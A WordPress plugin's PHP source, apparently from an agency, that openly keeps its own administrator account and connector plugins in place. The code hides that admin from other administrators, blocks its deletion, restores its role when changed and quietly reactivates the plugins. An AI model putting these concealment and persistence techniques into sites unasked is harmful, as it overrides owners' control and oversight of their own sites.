<?php
/**
 * Plugin Name:       BlogLogistics Site Management Tools
 * Plugin URI:        https://github.com/bloglogisticsdev/bloglogistics-site-management-tools
 * Description:       Protects BlogLogistics managed-site access, including the BlogLogistics admin account and MainWP Child connector.
 * Version:           1.1.1
 * Requires at least: 7.0
 * Requires PHP:      8.3
 * Author:            BlogLogistics
 * Author URI:        https://www.bloglogistics.com/
 * License:           GPL-3.0-or-later
 * License URI:       https://www.gnu.org/licenses/gpl-3.0.html
 * Update URI:        https://updates.bloglogistics.com/plugins/bloglogistics-site-management-tools.json
 * Text Domain:       bloglogistics-site-management-tools
 */

if ( ! defined( 'ABSPATH' ) ) {
    exit;
}

define( 'BLOGLOGISTICS_SMT_VERSION', '1.1.1' );
define( 'BLOGLOGISTICS_SMT_SLUG', 'bloglogistics-site-management-tools' );
define( 'BLOGLOGISTICS_SMT_FILE', __FILE__ );
define( 'BLOGLOGISTICS_SMT_DIR', plugin_dir_path( __FILE__ ) );
define( 'BLOGLOGISTICS_SMT_UPDATE_MANIFEST_URL', 'https://updates.bloglogistics.com/plugins/bloglogistics-site-management-tools.json' );
define( 'BLOGLOGISTICS_SMT_PLUGIN_INDEX_URL', 'https://updates.bloglogistics.com/plugins/bloglogistics-plugin-index.json' );

$bloglogistics_smt_puc = BLOGLOGISTICS_SMT_DIR . 'vendor/plugin-update-checker/plugin-update-checker.php';

if ( file_exists( $bloglogistics_smt_puc ) ) {
    if ( ! class_exists( \YahnisElsts\PluginUpdateChecker\v5\PucFactory::class, false ) ) {
        require_once $bloglogistics_smt_puc;
    }

    require_once BLOGLOGISTICS_SMT_DIR . 'includes/class-bloglogistics-site-management-tools-updater.php';

    BlogLogistics_Site_Management_Tools_Updater::init( [
        'repo_url'    => BLOGLOGISTICS_SMT_UPDATE_MANIFEST_URL,
        'plugin_file' => BLOGLOGISTICS_SMT_FILE,
        'slug'        => BLOGLOGISTICS_SMT_SLUG,
    ] );
}

if ( ! class_exists( 'BlogLogistics_Site_Management_Tools', false ) ) {

    final class BlogLogistics_Site_Management_Tools {

        private const PROTECTED_LOGIN = 'bloglogistics';
        private const MAINWP_CHILD_PLUGIN = 'mainwp-child/mainwp-child.php';
        private const OLD_GUARD_PLUGIN = 'bloglogistics-maintenance-access/bloglogistics-maintenance-access.php';
        private const SELF_PLUGIN = 'bloglogistics-site-management-tools/bloglogistics-site-management-tools.php';

        /**
         * Initialise plugin hooks.
         */
        public static function init(): void {
            add_filter( 'pre_get_users', [ __CLASS__, 'hide_protected_user_from_user_queries' ] );
            add_action( 'pre_user_query', [ __CLASS__, 'hide_protected_user_from_user_table_sql' ] );
            add_filter( 'rest_user_query', [ __CLASS__, 'hide_protected_user_from_rest_queries' ], 10, 2 );
            add_filter( 'wp_dropdown_users_args', [ __CLASS__, 'hide_protected_user_from_dropdowns' ] );

            add_filter( 'bulk_actions-users', [ __CLASS__, 'remove_user_bulk_delete_for_other_admins' ] );
            add_action( 'delete_user', [ __CLASS__, 'block_protected_user_deletion' ], 0, 1 );
            add_action( 'remove_user_from_blog', [ __CLASS__, 'block_protected_user_deletion' ], 0, 1 );
            add_action( 'profile_update', [ __CLASS__, 'protect_account_after_profile_update' ], 10, 3 );
            add_action( 'set_user_role', [ __CLASS__, 'protect_account_after_role_change' ], 10, 3 );

            add_filter( 'all_plugins', [ __CLASS__, 'hide_protected_plugins' ] );
            add_action( 'pre_current_active_plugins', [ __CLASS__, 'hide_protected_plugins_from_list_table' ] );
            add_filter( 'plugin_action_links', [ __CLASS__, 'remove_protected_plugin_action_links' ], 10, 4 );
            add_filter( 'network_admin_plugin_action_links', [ __CLASS__, 'remove_protected_plugin_action_links' ], 10, 4 );
            add_filter( 'bulk_actions-plugins', [ __CLASS__, 'remove_plugin_bulk_actions_for_other_admins' ] );
            add_filter( 'pre_update_option_active_plugins', [ __CLASS__, 'prevent_protected_plugin_deactivation' ], 10, 2 );
            add_action( 'admin_menu', [ __CLASS__, 'hide_mainwp_child_menus' ], 999 );
            add_action( 'network_admin_menu', [ __CLASS__, 'hide_mainwp_child_menus' ], 999 );

            add_filter( 'site_transient_update_plugins', [ __CLASS__, 'add_inactive_bloglogistics_plugin_updates' ] );
            add_filter( 'plugins_api', [ __CLASS__, 'provide_inactive_bloglogistics_plugin_information' ], 10, 3 );
        }

        /**
         * Determine whether the current user is the protected BlogLogistics account.
         */
        private static function is_bloglogistics_user(): bool {
            $user = wp_get_current_user();

            return $user instanceof WP_User && self::PROTECTED_LOGIN === $user->user_login;
        }

        /**
         * Get the protected account user ID.
         */
        private static function get_protected_user_id(): int {
            $user = get_user_by( 'login', self::PROTECTED_LOGIN );

            return $user instanceof WP_User ? (int) $user->ID : 0;
        }

        /**
         * List plugins that should be protected from normal admin handling.
         *
         * @return string[]
         */
        private static function get_protected_plugins(): array {
            return [
                self::MAINWP_CHILD_PLUGIN,
                self::SELF_PLUGIN,
                self::OLD_GUARD_PLUGIN,
            ];
        }

        /**
         * Hide protected user from WP_User_Query results.
         *
         * @param WP_User_Query $query User query.
         */
        public static function hide_protected_user_from_user_queries( $query ): void {
            if ( self::is_bloglogistics_user() ) {
                return;
            }

            $protected_id = self::get_protected_user_id();
            if ( ! $protected_id ) {
                return;
            }

            $excluded = (array) $query->get( 'exclude' );
            $excluded[] = $protected_id;
            $query->set( 'exclude', array_values( array_unique( array_map( 'absint', $excluded ) ) ) );
        }

        /**
         * Hide protected user from the Users table SQL query.
         *
         * @param WP_User_Query $user_search User query.
         */
        public static function hide_protected_user_from_user_table_sql( $user_search ): void {
            if ( self::is_bloglogistics_user() ) {
                return;
            }

            global $wpdb;
            $user_search->query_where .= $wpdb->prepare( " AND {$wpdb->users}.user_login != %s", self::PROTECTED_LOGIN );
        }

        /**
         * Hide protected user from REST user queries.
         *
         * @param array           $prepared_args Prepared args.
         * @param WP_REST_Request $request Request object.
         * @return array
         */
        public static function hide_protected_user_from_rest_queries( array $prepared_args, $request ): array {
            if ( self::is_bloglogistics_user() ) {
                return $prepared_args;
            }

            $protected_id = self::get_protected_user_id();
            if ( ! $protected_id ) {
                return $prepared_args;
            }

            $excluded = isset( $prepared_args['exclude'] ) ? (array) $prepared_args['exclude'] : [];
            $excluded[] = $protected_id;
            $prepared_args['exclude'] = array_values( array_unique( array_map( 'absint', $excluded ) ) );

            return $prepared_args;
        }

        /**
         * Hide protected user from dropdowns.
         *
         * @param array $args Dropdown args.
         * @return array
         */
        public static function hide_protected_user_from_dropdowns( array $args ): array {
            if ( self::is_bloglogistics_user() ) {
                return $args;
            }

            $protected_id = self::get_protected_user_id();
            if ( ! $protected_id ) {
                return $args;
            }

            $excluded = isset( $args['exclude'] ) ? (array) $args['exclude'] : [];
            $excluded[] = $protected_id;
            $args['exclude'] = array_values( array_unique( array_map( 'absint', $excluded ) ) );

            return $args;
        }

        /**
         * Remove bulk user deletion for users other than BlogLogistics.
         *
         * @param array $actions Bulk actions.
         * @return array
         */
        public static function remove_user_bulk_delete_for_other_admins( array $actions ): array {
            if ( ! self::is_bloglogistics_user() ) {
                unset( $actions['delete'] );
            }

            return $actions;
        }

        /**
         * Block protected user deletion.
         *
         * @param int $user_id User ID.
         */
        public static function block_protected_user_deletion( int $user_id ): void {
            if ( self::is_bloglogistics_user() ) {
                return;
            }

            if ( $user_id === self::get_protected_user_id() ) {
                wp_die(
                    esc_html__( 'The BlogLogistics management account is protected and cannot be deleted from this screen.', 'bloglogistics-site-management-tools' ),
                    esc_html__( 'Protected account', 'bloglogistics-site-management-tools' ),
                    [ 'response' => 403 ]
                );
            }
        }

        /**
         * Restore important fields if another admin edits the protected account.
         *
         * @param int     $user_id       User ID.
         * @param WP_User $old_user_data Old user data.
         * @param array   $userdata      New user data.
         */
        public static function protect_account_after_profile_update( int $user_id, $old_user_data, array $userdata ): void {
            if ( self::is_bloglogistics_user() || $user_id !== self::get_protected_user_id() ) {
                return;
            }

            if ( ! user_can( $user_id, 'administrator' ) ) {
                $user = new WP_User( $user_id );
                $user->set_role( 'administrator' );
            }
        }

        /**
         * Restore administrator role if another admin downgrades the protected account.
         *
         * @param int      $user_id   User ID.
         * @param string   $role      New role.
         * @param string[] $old_roles Old roles.
         */
        public static function protect_account_after_role_change( int $user_id, string $role, array $old_roles ): void {
            if ( self::is_bloglogistics_user() || $user_id !== self::get_protected_user_id() ) {
                return;
            }

            if ( 'administrator' !== $role ) {
                $user = new WP_User( $user_id );
                $user->set_role( 'administrator' );
            }
        }

        /**
         * Hide protected plugins from normal plugin lists.
         *
         * @param array $plugins Plugins.
         * @return array
         */
        public static function hide_protected_plugins( array $plugins ): array {
            if ( self::is_bloglogistics_user() ) {
                return $plugins;
            }

            foreach ( self::get_protected_plugins() as $plugin_file ) {
                unset( $plugins[ $plugin_file ] );
            }

            return $plugins;
        }

        /**
         * Hide protected plugins from the plugin list table.
         */
        public static function hide_protected_plugins_from_list_table(): void {
            if ( self::is_bloglogistics_user() ) {
                return;
            }

            global $wp_list_table;

            if ( empty( $wp_list_table->items ) || ! is_array( $wp_list_table->items ) ) {
                return;
            }

            foreach ( self::get_protected_plugins() as $plugin_file ) {
                unset( $wp_list_table->items[ $plugin_file ] );
            }
        }

        /**
         * Remove action links for protected plugins.
         *
         * @param array  $actions     Plugin action links.
         * @param string $plugin_file Plugin file.
         * @param array  $plugin_data Plugin data.
         * @param string $context     Context.
         * @return array
         */
        public static function remove_protected_plugin_action_links( array $actions, string $plugin_file, array $plugin_data, string $context ): array {
            if ( self::is_bloglogistics_user() ) {
                return $actions;
            }

            if ( in_array( $plugin_file, self::get_protected_plugins(), true ) ) {
                unset( $actions['deactivate'], $actions['delete'], $actions['edit'] );
            }

            return $actions;
        }

        /**
         * Remove plugin bulk actions for users other than BlogLogistics.
         *
         * @param array $actions Bulk actions.
         * @return array
         */
        public static function remove_plugin_bulk_actions_for_other_admins( array $actions ): array {
            if ( ! self::is_bloglogistics_user() ) {
                unset( $actions['deactivate-selected'], $actions['delete-selected'] );
            }

            return $actions;
        }

        /**
         * Prevent protected plugins from being deactivated through option updates.
         *
         * @param array $new_value New active plugins.
         * @param array $old_value Old active plugins.
         * @return array
         */
        public static function prevent_protected_plugin_deactivation( array $new_value, array $old_value ): array {
            if ( self::is_bloglogistics_user() ) {
                return $new_value;
            }

            foreach ( self::get_protected_plugins() as $plugin_file ) {
                if ( in_array( $plugin_file, $old_value, true ) && ! in_array( $plugin_file, $new_value, true ) ) {
                    $new_value[] = $plugin_file;
                }
            }

            return array_values( array_unique( $new_value ) );
        }



        /**
         * Add update offers for inactive official BlogLogistics plugins.
         *
         * Inactive plugins cannot run their own updater code. This method uses a single
         * approved plugin index from updates.bloglogistics.com and checks only installed,
         * inactive plugins listed there. It does not guess manifest URLs and it does not
         * scan one-off BlogLogistics plugins.
         *
         * @param object|false $transient WordPress plugin update transient.
         * @return object|false
         */
        public static function add_inactive_bloglogistics_plugin_updates( $transient ) {
            if ( ! is_object( $transient ) ) {
                return $transient;
            }

            if ( ! function_exists( 'get_plugins' ) ) {
                require_once ABSPATH . 'wp-admin/includes/plugin.php';
            }

            if ( ! function_exists( 'is_plugin_active' ) ) {
                require_once ABSPATH . 'wp-admin/includes/plugin.php';
            }

            $installed_plugins = get_plugins();
            if ( empty( $installed_plugins ) || ! is_array( $installed_plugins ) ) {
                return $transient;
            }

            $plugin_index = self::get_bloglogistics_plugin_index();
            if ( empty( $plugin_index ) ) {
                return $transient;
            }

            foreach ( $installed_plugins as $plugin_file => $plugin_data ) {
                if ( is_plugin_active( $plugin_file ) ) {
                    continue;
                }

                $folder_slug = self::get_plugin_folder_slug( $plugin_file );
                if ( '' === $folder_slug || empty( $plugin_index[ $folder_slug ] ) ) {
                    continue;
                }

                $manifest = self::get_bloglogistics_plugin_manifest( $plugin_index[ $folder_slug ] );
                if ( empty( $manifest['version'] ) || empty( $manifest['download_url'] ) ) {
                    continue;
                }

                $installed_version = isset( $plugin_data['Version'] ) ? (string) $plugin_data['Version'] : '';
                if ( '' === $installed_version || ! version_compare( (string) $manifest['version'], $installed_version, '>' ) ) {
                    continue;
                }

                if ( ! self::is_allowed_bloglogistics_download_url( (string) $manifest['download_url'] ) ) {
                    continue;
                }

                if ( ! isset( $transient->response ) || ! is_array( $transient->response ) ) {
                    $transient->response = [];
                }

                $transient->response[ $plugin_file ] = (object) [
                    'id'           => $plugin_file,
                    'slug'         => $folder_slug,
                    'plugin'       => $plugin_file,
                    'new_version'  => (string) $manifest['version'],
                    'url'          => isset( $manifest['homepage'] ) ? (string) $manifest['homepage'] : '',
                    'package'      => (string) $manifest['download_url'],
                    'icons'        => [],
                    'banners'      => [],
                    'banners_rtl'  => [],
                    'requires'     => isset( $manifest['requires'] ) ? (string) $manifest['requires'] : '',
                    'tested'       => isset( $manifest['tested'] ) ? (string) $manifest['tested'] : '',
                    'requires_php' => isset( $manifest['requires_php'] ) ? (string) $manifest['requires_php'] : '',
                    'sections'     => isset( $manifest['sections'] ) && is_array( $manifest['sections'] ) ? $manifest['sections'] : [],
                ];
            }

            return $transient;
        }



        /**
         * Provide plugin information modal details for inactive official BlogLogistics plugins.
         *
         * WordPress asks the plugins_api filter for details when an administrator clicks
         * the "View version details" link. Inactive plugins cannot provide their own
         * Plugin Update Checker response, so Site Management Tools provides the response
         * for installed inactive BlogLogistics plugins listed in the approved index.
         *
         * @param false|object|array $result Existing API result.
         * @param string             $action API action.
         * @param object             $args   API arguments.
         * @return false|object|array
         */
        public static function provide_inactive_bloglogistics_plugin_information( $result, string $action, $args ) {
            if ( 'plugin_information' !== $action || ! is_object( $args ) || empty( $args->slug ) ) {
                return $result;
            }

            if ( ! function_exists( 'get_plugins' ) || ! function_exists( 'is_plugin_active' ) ) {
                require_once ABSPATH . 'wp-admin/includes/plugin.php';
            }

            $requested_slug    = sanitize_text_field( (string) $args->slug );
            $installed_plugins = get_plugins();
            if ( empty( $installed_plugins ) || ! is_array( $installed_plugins ) ) {
                return $result;
            }

            $plugin_index = self::get_bloglogistics_plugin_index();
            if ( empty( $plugin_index[ $requested_slug ] ) ) {
                return $result;
            }

            $matching_plugin_file = '';
            $matching_plugin_data = [];
            foreach ( $installed_plugins as $plugin_file => $plugin_data ) {
                if ( is_plugin_active( $plugin_file ) ) {
                    continue;
                }

                if ( $requested_slug === self::get_plugin_folder_slug( $plugin_file ) ) {
                    $matching_plugin_file = $plugin_file;
                    $matching_plugin_data = is_array( $plugin_data ) ? $plugin_data : [];
                    break;
                }
            }

            if ( '' === $matching_plugin_file ) {
                return $result;
            }

            $manifest = self::get_bloglogistics_plugin_manifest( $plugin_index[ $requested_slug ] );
            if ( empty( $manifest['version'] ) || empty( $manifest['download_url'] ) ) {
                return $result;
            }

            if ( ! self::is_allowed_bloglogistics_download_url( (string) $manifest['download_url'] ) ) {
                return $result;
            }

            $sections = isset( $manifest['sections'] ) && is_array( $manifest['sections'] ) ? $manifest['sections'] : [];
            if ( empty( $sections['description'] ) && ! empty( $matching_plugin_data['Description'] ) ) {
                $sections['description'] = (string) $matching_plugin_data['Description'];
            }
            if ( empty( $sections['changelog'] ) ) {
                $sections['changelog'] = '<p>' . esc_html__( 'No changelog is available for this release.', 'bloglogistics-site-management-tools' ) . '</p>';
            }

            return (object) [
                'name'          => isset( $manifest['name'] ) ? (string) $manifest['name'] : ( $matching_plugin_data['Name'] ?? $requested_slug ),
                'slug'          => $requested_slug,
                'version'       => (string) $manifest['version'],
                'author'        => isset( $matching_plugin_data['Author'] ) ? (string) $matching_plugin_data['Author'] : 'BlogLogistics',
                'author_profile'=> isset( $matching_plugin_data['AuthorURI'] ) ? (string) $matching_plugin_data['AuthorURI'] : 'https://www.bloglogistics.com/',
                'homepage'      => isset( $manifest['homepage'] ) ? (string) $manifest['homepage'] : '',
                'requires'      => isset( $manifest['requires'] ) ? (string) $manifest['requires'] : '',
                'tested'        => isset( $manifest['tested'] ) ? (string) $manifest['tested'] : '',
                'requires_php'  => isset( $manifest['requires_php'] ) ? (string) $manifest['requires_php'] : '',
                'last_updated'  => isset( $manifest['last_updated'] ) ? (string) $manifest['last_updated'] : '',
                'sections'      => $sections,
                'download_link' => (string) $manifest['download_url'],
                'package'       => (string) $manifest['download_url'],
                'external'      => true,
            ];
        }

        /**
         * Get the installed plugin folder slug.
         *
         * @param string $plugin_file Plugin file path relative to the plugins directory.
         * @return string
         */
        private static function get_plugin_folder_slug( string $plugin_file ): string {
            if ( false === strpos( $plugin_file, '/' ) ) {
                return preg_replace( '/\.php$/', '', $plugin_file );
            }

            return dirname( $plugin_file );
        }

        /**
         * Fetch and cache the approved BlogLogistics plugin index.
         *
         * @return array<string, string> Map of plugin folder slugs to manifest URLs.
         */
        private static function get_bloglogistics_plugin_index(): array {
            $cached = get_site_transient( 'bloglogistics_smt_plugin_index' );
            if ( is_array( $cached ) ) {
                return $cached;
            }

            $response = wp_remote_get(
                BLOGLOGISTICS_SMT_PLUGIN_INDEX_URL,
                [
                    'timeout'     => 8,
                    'redirection' => 2,
                ]
            );

            if ( is_wp_error( $response ) || 200 !== wp_remote_retrieve_response_code( $response ) ) {
                set_site_transient( 'bloglogistics_smt_plugin_index', [], HOUR_IN_SECONDS );
                return [];
            }

            $body = wp_remote_retrieve_body( $response );
            $data = json_decode( $body, true );
            if ( ! is_array( $data ) || empty( $data['plugins'] ) || ! is_array( $data['plugins'] ) ) {
                set_site_transient( 'bloglogistics_smt_plugin_index', [], HOUR_IN_SECONDS );
                return [];
            }

            $index = [];
            foreach ( $data['plugins'] as $plugin ) {
                if ( empty( $plugin['slug'] ) || empty( $plugin['manifest_url'] ) ) {
                    continue;
                }

                $slug         = sanitize_text_field( (string) $plugin['slug'] );
                $manifest_url = esc_url_raw( (string) $plugin['manifest_url'] );

                if ( '' === $slug || ! self::is_allowed_manifest_url( $manifest_url ) ) {
                    continue;
                }

                $index[ $slug ] = $manifest_url;
            }

            set_site_transient( 'bloglogistics_smt_plugin_index', $index, 6 * HOUR_IN_SECONDS );

            return $index;
        }

        /**
         * Fetch and cache a single plugin manifest.
         *
         * @param string $manifest_url Manifest URL.
         * @return array<string, mixed>
         */
        private static function get_bloglogistics_plugin_manifest( string $manifest_url ): array {
            if ( ! self::is_allowed_manifest_url( $manifest_url ) ) {
                return [];
            }

            $cache_key = 'bloglogistics_smt_manifest_' . md5( $manifest_url );
            $cached    = get_site_transient( $cache_key );
            if ( is_array( $cached ) ) {
                return $cached;
            }

            $response = wp_remote_get(
                $manifest_url,
                [
                    'timeout'     => 8,
                    'redirection' => 2,
                ]
            );

            if ( is_wp_error( $response ) || 200 !== wp_remote_retrieve_response_code( $response ) ) {
                set_site_transient( $cache_key, [], HOUR_IN_SECONDS );
                return [];
            }

            $body     = wp_remote_retrieve_body( $response );
            $manifest = json_decode( $body, true );
            if ( ! is_array( $manifest ) ) {
                set_site_transient( $cache_key, [], HOUR_IN_SECONDS );
                return [];
            }

            set_site_transient( $cache_key, $manifest, 6 * HOUR_IN_SECONDS );

            return $manifest;
        }

        /**
         * Validate manifest URLs so this plugin never probes random endpoints.
         *
         * @param string $url Manifest URL.
         * @return bool
         */
        private static function is_allowed_manifest_url( string $url ): bool {
            $parts = wp_parse_url( $url );

            return is_array( $parts )
                && 'https' === ( $parts['scheme'] ?? '' )
                && 'updates.bloglogistics.com' === ( $parts['host'] ?? '' )
                && isset( $parts['path'] )
                && 0 === strpos( $parts['path'], '/plugins/' )
                && '.json' === substr( $parts['path'], -5 );
        }

        /**
         * Validate package URLs before placing them in WordPress update data.
         *
         * @param string $url Download URL.
         * @return bool
         */
        private static function is_allowed_bloglogistics_download_url( string $url ): bool {
            $parts = wp_parse_url( $url );

            return is_array( $parts )
                && 'https' === ( $parts['scheme'] ?? '' )
                && 'github.com' === ( $parts['host'] ?? '' )
                && isset( $parts['path'] )
                && 0 === strpos( $parts['path'], '/bloglogisticsdev/' )
                && false !== strpos( $parts['path'], '/releases/download/' )
                && '.zip' === substr( $parts['path'], -4 );
        }

        /**
         * Hide MainWP Child menus from users other than BlogLogistics.
         */
        public static function hide_mainwp_child_menus(): void {
            if ( self::is_bloglogistics_user() ) {
                return;
            }

            remove_menu_page( 'mainwp_child_tab' );
            remove_menu_page( 'mainwp-child' );
            remove_submenu_page( 'options-general.php', 'mainwp_child_tab' );
            remove_submenu_page( 'options-general.php', 'mainwp-child' );
            remove_submenu_page( 'settings.php', 'mainwp_child_tab' );
            remove_submenu_page( 'settings.php', 'mainwp-child' );
        }
    }
}

BlogLogistics_Site_Management_Tools::init();
